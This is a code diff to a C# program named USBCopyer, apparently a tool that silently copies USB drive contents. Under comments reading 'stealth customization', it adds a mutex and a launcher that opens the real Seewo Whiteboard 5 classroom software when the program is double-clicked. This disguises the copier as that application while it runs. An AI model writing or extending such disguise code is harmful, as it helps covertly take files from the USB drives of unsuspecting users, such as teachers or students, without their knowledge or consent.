@@ -13,6 +13,10 @@ namespace USBCopyer
         public static EventLog logger = showicon ? new EventLog("Application", ".", "Application") : null;
         public static System.Drawing.Icon ico = System.Drawing.Icon.ExtractAssociatedIcon(Application.ExecutablePath);
 
+        // 隐藏性定制：单实例判定（Mutex），与真实希沃白板进程互不干扰
+        public static Mutex singleInstanceMutex = null;
+        public static bool singleInstanceCreatedNew = false;
+
         /// <summary>
         /// 应用程序的主入口点。
         /// </summary>
@@ -70,6 +74,10 @@ namespace USBCopyer
                     }
                 }
                 
+                // 隐藏性定制：无参数双击启动时，先打开电脑中真实安装的希沃白板5，再进行后续操作
+                if (args.Length == 0)
+                    EasiNoteLauncher.TryLaunch();
+
                 if (!useUglyUI)
                     Application.EnableVisualStyles();
 
